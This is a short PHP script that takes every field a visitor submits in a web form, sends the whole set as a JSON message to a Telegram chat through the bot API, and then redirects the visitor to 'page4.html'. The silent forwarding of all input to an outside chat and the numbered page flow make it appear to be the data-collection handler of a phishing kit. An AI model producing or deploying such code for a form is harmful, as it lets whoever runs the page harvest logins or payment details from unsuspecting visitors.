<?php
// Telegram Bot Integration
$botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
$chatId = 'YOUR_CHAT_ID';

$webhookUrl = "https://api.telegram.org/bot$botToken/";

// Get form data
$data = json_encode($_POST, JSON_UNESCAPED_UNICODE);

// Send to Telegram
$response = file_get_contents($webhookUrl . 'sendMessage?chat_id=' . $chatId . 
                             '&text=' . urlencode($data));

// Redirect to confirmation page
header('Location: page4.html');
exit;
?>
